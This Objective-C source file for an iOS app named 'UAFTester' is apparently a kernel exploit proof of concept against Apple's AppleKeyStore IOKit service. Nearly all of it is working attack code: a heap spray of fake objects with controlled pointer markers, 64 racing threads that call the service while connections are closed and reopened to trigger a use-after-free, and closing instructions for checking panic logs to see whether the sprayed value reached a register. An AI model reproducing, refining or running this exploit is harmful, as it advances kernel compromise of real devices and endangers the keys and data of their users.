//
//  ViewController.m
//  UAFTester
//
//  v4 - Fixed for Xcode 26.2 strict compilation
//

#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>
#import <string.h>
#import <unistd.h>

#define AKS_SERVICE  "AppleKeyStore"
#define NUM_RACERS   64
#define MAX_ATTEMPTS 5000

// ========== HEAP SPRAY CONFIGURATION ==========
#define SPRAY_COUNT         1000
#define SPRAY_BUFFER_SIZE   1024
#define SPRAY_DELAY_MS      50
#define REFILL_INTERVAL     10
// ==============================================

static _Atomic int g_phase = 0;
static io_connect_t g_conn = IO_OBJECT_NULL;
static _Atomic unsigned int g_calls = 0;
static _Atomic unsigned int g_errors = 0;
static _Atomic int g_should_stop = 0;

// ========== HEAP SPRAY GLOBALS ==========
static io_connect_t g_spray_conns[SPRAY_COUNT];
static int g_spray_count = 0;
// ========================================

// ========== IMPROVED fake gate structure ==========
typedef struct __attribute__((packed)) {
    uint64_t vtable;
    uint64_t lock;
    uint64_t refcount;
    uint64_t pad1[31];
    uint64_t target_at_0x110;
    uint64_t marker_0x118;
    uint64_t marker_0x120;
    uint64_t marker_0x128;
    uint64_t marker_0x130;
    uint64_t marker_0x138;
    uint64_t pad2[88];
} fake_gate_t;

// Compile-time assertions
_Static_assert(sizeof(fake_gate_t) == 1024, "fake_gate_t must be 1024 bytes");
_Static_assert(__builtin_offsetof(fake_gate_t, target_at_0x110) == 0x110, "target_at_0x110 must be at offset 0x110");
// ===================================================

static void *racer_thread(void *arg) {
    (void)arg;
    
    while (atomic_load(&g_phase) < 1) {
        sched_yield();
    }
    
    while (atomic_load(&g_phase) < 3) {
        if (atomic_load(&g_should_stop)) {
            break;
        }
        
        uint64_t input[1] = {0xDEADBEEFULL};
        uint32_t out_cnt = 0;
        
        kern_return_t kr = IOConnectCallMethod(
            g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
        
        atomic_fetch_add(&g_calls, 1);
        
        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
            atomic_fetch_add(&g_errors, 1);
            atomic_store(&g_should_stop, 1);
            break;
        }
        
        sched_yield();
    }
    
    return NULL;
}

static void init_fake_gate(fake_gate_t *gate, int variant) {
    memset(gate, 0, sizeof(fake_gate_t));
    
    gate->vtable = 0x4141414141414141ULL;
    gate->lock = 0x0000000000000000ULL;
    gate->refcount = 0x0000000100000001ULL;
    
    for (int i = 0; i < 31; i++) {
        gate->pad1[i] = 0x2020202020202020ULL;
    }
    
    switch (variant % 6) {
        case 0:
            gate->target_at_0x110 = 0x4242424242424242ULL;
            gate->marker_0x118 = 0x4343434343434343ULL;
            gate->marker_0x120 = 0x4444444444444444ULL;
            break;
        case 1:
            gate->target_at_0x110 = 0x5252525252525252ULL;
            gate->marker_0x118 = 0x5353535353535353ULL;
            gate->marker_0x120 = 0x5454545454545454ULL;
            break;
        case 2:
            gate->target_at_0x110 = 0x6262626262626262ULL;
            gate->marker_0x118 = 0x6363636363636363ULL;
            gate->marker_0x120 = 0x6464646464646464ULL;
            break;
        case 3:
            gate->target_at_0x110 = 0x7272727272727272ULL;
            gate->marker_0x118 = 0x7373737373737373ULL;
            gate->marker_0x120 = 0x7474747474747474ULL;
            break;
        case 4:
            gate->target_at_0x110 = 0x8282828282828282ULL;
            gate->marker_0x118 = 0x8383838383838383ULL;
            gate->marker_0x120 = 0x8484848484848484ULL;
            break;
        case 5:
            gate->target_at_0x110 = 0x9292929292929292ULL;
            gate->marker_0x118 = 0x9393939393939393ULL;
            gate->marker_0x120 = 0x9494949494949494ULL;
            break;
        default:
            gate->target_at_0x110 = 0x4242424242424242ULL;
            gate->marker_0x118 = 0x4343434343434343ULL;
            gate->marker_0x120 = 0x4444444444444444ULL;
            break;
    }
    
    gate->marker_0x128 = 0x4545454545454545ULL;
    gate->marker_0x130 = 0x4646464646464646ULL;
    gate->marker_0x138 = 0x4747474747474747ULL;
    
    for (int i = 0; i < 88; i++) {
        gate->pad2[i] = 0x3030303030303030ULL;
    }
}

static int heap_spray_phase(io_service_t svc, void(^log_callback)(NSString *), BOOL is_refill) {
    kern_return_t kr;
    int start_idx = is_refill ? (g_spray_count / 2) : 0;
    int target_count = is_refill ? g_spray_count : SPRAY_COUNT;
    
    if (!is_refill) {
        log_callback(@"");
        log_callback(@"╔══════════════════════════════════════════════════╗");
        log_callback(@"║           HEAP SPRAY v4 - IMPROVED               ║");
        log_callback(@"╚══════════════════════════════════════════════════╝");
        log_callback([NSString stringWithFormat:@"Target connections: %d", SPRAY_COUNT]);
        log_callback([NSString stringWithFormat:@"Structure size: %zu bytes", sizeof(fake_gate_t)]);
        log_callback(@"Marker at 0x110: VERIFIED ✓");
    } else {
        log_callback(@"[REFILL] Refreshing heap spray...");
    }
    
    int opened = 0;
    for (int i = start_idx; i < target_count; i++) {
        if (is_refill && g_spray_conns[i] != IO_OBJECT_NULL) {
            continue;
        }
        
        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_spray_conns[i]);
        
        if (kr != KERN_SUCCESS) {
            if (kr == 0xe00002c7) {
                if (!is_refill) {
                    log_callback([NSString stringWithFormat:@"[SPRAY] Resource limit at %d connections", i]);
                    g_spray_count = i;
                }
                break;
            }
            g_spray_conns[i] = IO_OBJECT_NULL;
            continue;
        }
        opened++;
    }
    
    if (!is_refill && g_spray_count == 0) {
        g_spray_count = opened;
    }
    
    if (!is_refill) {
        log_callback([NSString stringWithFormat:@"[SPRAY] Opened %d connections", g_spray_count]);
    }
    
    int sprayed = 0;
    for (int i = start_idx; i < g_spray_count; i++) {
        if (g_spray_conns[i] == IO_OBJECT_NULL) continue;
        
        fake_gate_t fakeGate;
        init_fake_gate(&fakeGate, i);
        
        uint64_t scalar_input = 0xDEADBEEFULL + (uint64_t)i;
        kr = IOConnectCallMethod(
            g_spray_conns[i],
            1,
            &scalar_input, 1,
            &fakeGate, sizeof(fakeGate),
            NULL, NULL,
            NULL, NULL
        );
        
        if (kr == KERN_SUCCESS) {
            sprayed++;
        }
    }
    
    if (!is_refill) {
        log_callback([NSString stringWithFormat:@"[SPRAY] Sprayed %d fake objects", sprayed]);
        log_callback(@"[SPRAY] ✓ Heap preparation complete");
        usleep((useconds_t)(SPRAY_DELAY_MS * 1000));
    }
    
    return sprayed;
}

static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
    log_callback([NSString stringWithFormat:@"[CLEANUP] Closing %d connections", g_spray_count]);
    
    for (int i = 0; i < g_spray_count; i++) {
        if (g_spray_conns[i] != IO_OBJECT_NULL) {
            IOServiceClose(g_spray_conns[i]);
            g_spray_conns[i] = IO_OBJECT_NULL;
        }
    }
    
    g_spray_count = 0;
}

// ================================================================

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UITextView *textView;
@property (weak, nonatomic) IBOutlet UIButton *testButton;
@property (nonatomic, strong) NSMutableString *logBuffer;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.logBuffer = [NSMutableString string];
    [self appendLog:@"UAF Tester v4 - Improved Ready"];
    [self appendLog:@"Changes: Better timing, larger spray, adaptive refill"];
}

- (void)appendLog:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        [self.logBuffer appendFormat:@"%@\n", msg];
        self.textView.text = self.logBuffer;
        
        NSRange bottom = NSMakeRange(self.textView.text.length - 1, 1);
        [self.textView scrollRangeToVisible:bottom];
    });
    NSLog(@"%@", msg);
}

- (IBAction)runTest:(id)sender {
    self.testButton.enabled = NO;
    [self.logBuffer setString:@""];
    [self appendLog:@"═══════════════════════════════════════"];
    [self appendLog:@"  UAF Test v4 - IMPROVED STRATEGY"];
    [self appendLog:@"═══════════════════════════════════════"];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        [self runImprovedUAF];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.testButton.enabled = YES;
        });
    });
}

- (void)runImprovedUAF {
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                                                    IOServiceMatching(AKS_SERVICE));
    if (!svc) {
        [self appendLog:@"❌ Failed to find AppleKeyStore service"];
        return;
    }
    
    atomic_store(&g_phase, 0);
    atomic_store(&g_calls, 0);
    atomic_store(&g_errors, 0);
    atomic_store(&g_should_stop, 0);
    
    [self appendLog:@""];
    [self appendLog:@">>> PHASE 1: HEAP SPRAY"];
    
    int spray_result = heap_spray_phase(svc, ^(NSString *msg) {
        [self appendLog:msg];
    }, NO);
    
    if (spray_result < 100) {
        [self appendLog:@"❌ Heap spray failed - insufficient objects"];
        IOObjectRelease(svc);
        return;
    }
    
    [self appendLog:@""];
    [self appendLog:@">>> PHASE 2: UAF TRIGGER (ADAPTIVE)"];
    
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
        [self appendLog:@"❌ Failed to open target connection"];
        heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
        IOObjectRelease(svc);
        return;
    }
    
    [self appendLog:@"[UAF] Target connection opened"];
    
    pthread_t threads[NUM_RACERS];
    for (int i = 0; i < NUM_RACERS; i++) {
        pthread_create(&threads[i], NULL, racer_thread, NULL);
    }
    
    atomic_store(&g_phase, 1);
    [self appendLog:[NSString stringWithFormat:@"[UAF] Started %d racer threads", NUM_RACERS]];
    
    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        if (atomic_load(&g_should_stop)) {
            [self appendLog:[NSString stringWithFormat:@"✓ UAF TRIGGERED at attempt %d!", attempt]];
            break;
        }
        
        if (attempt > 0 && attempt % REFILL_INTERVAL == 0) {
            heap_spray_phase(svc, ^(NSString *msg) {
                // Silent refill
            }, YES);
        }
        
        kr = IOServiceClose(g_conn);
        usleep(1);
        
        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
        if (kr != KERN_SUCCESS) {
            [self appendLog:@"[UAF] Reopen failed - possible trigger!"];
            atomic_store(&g_should_stop, 1);
            break;
        }
        
        if ((attempt + 1) % 500 == 0) {
            unsigned int calls = atomic_load(&g_calls);
            unsigned int errors = atomic_load(&g_errors);
            [self appendLog:[NSString stringWithFormat:@"[%d/%d] calls=%u errors=%u", 
                            attempt + 1, MAX_ATTEMPTS, calls, errors]];
        }
    }
    
    atomic_store(&g_phase, 3);
    
    for (int i = 0; i < NUM_RACERS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned int total_calls = atomic_load(&g_calls);
    unsigned int total_errors = atomic_load(&g_errors);
    
    [self appendLog:@""];
    [self appendLog:@"═══════════════════════════════════════"];
    [self appendLog:@"  TEST RESULTS"];
    [self appendLog:@"═══════════════════════════════════════"];
    [self appendLog:[NSString stringWithFormat:@"Total racer calls:    %u", total_calls]];
    [self appendLog:[NSString stringWithFormat:@"Port death events:    %u", total_errors]];
    [self appendLog:[NSString stringWithFormat:@"Spray objects:        %d", spray_result]];
    
    if (total_errors > 0) {
        [self appendLog:@""];
        [self appendLog:@"✓✓✓ UAF SUCCESSFULLY TRIGGERED! ✓✓✓"];
        [self appendLog:@""];
        [self appendLog:@"Next steps:"];
        [self appendLog:@"1. Connect device to Mac/PC"];
        [self appendLog:@"2. Run: idevicecrashreport -e"];
        [self appendLog:@"3. Find latest panic-full-*.ips"];
        [self appendLog:@"4. Check x16 register value:"];
        [self appendLog:@""];
        [self appendLog:@"Expected marker values:"];
        [self appendLog:@"  0x4242... = Variant 0 (offset 0x110) ✓"];
        [self appendLog:@"  0x5252... = Variant 1"];
        [self appendLog:@"  0x6262... = Variant 2"];
        [self appendLog:@"  0x7272... = Variant 3"];
        [self appendLog:@"  0x8282... = Variant 4"];
        [self appendLog:@"  0x9292... = Variant 5"];
        [self appendLog:@""];
        [self appendLog:@"If x16 shows ANY of these = HEAP SPRAY SUCCESS! 🎉"];
    } else {
        [self appendLog:@""];
        [self appendLog:@"⚠️ UAF not detected in this run"];
        [self appendLog:@"Try running again or adjust parameters"];
    }
    [self appendLog:@"═══════════════════════════════════════"];
    
    if (g_conn != IO_OBJECT_NULL) {
        IOServiceClose(g_conn);
    }
    
    heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
    IOObjectRelease(svc);
}

@end
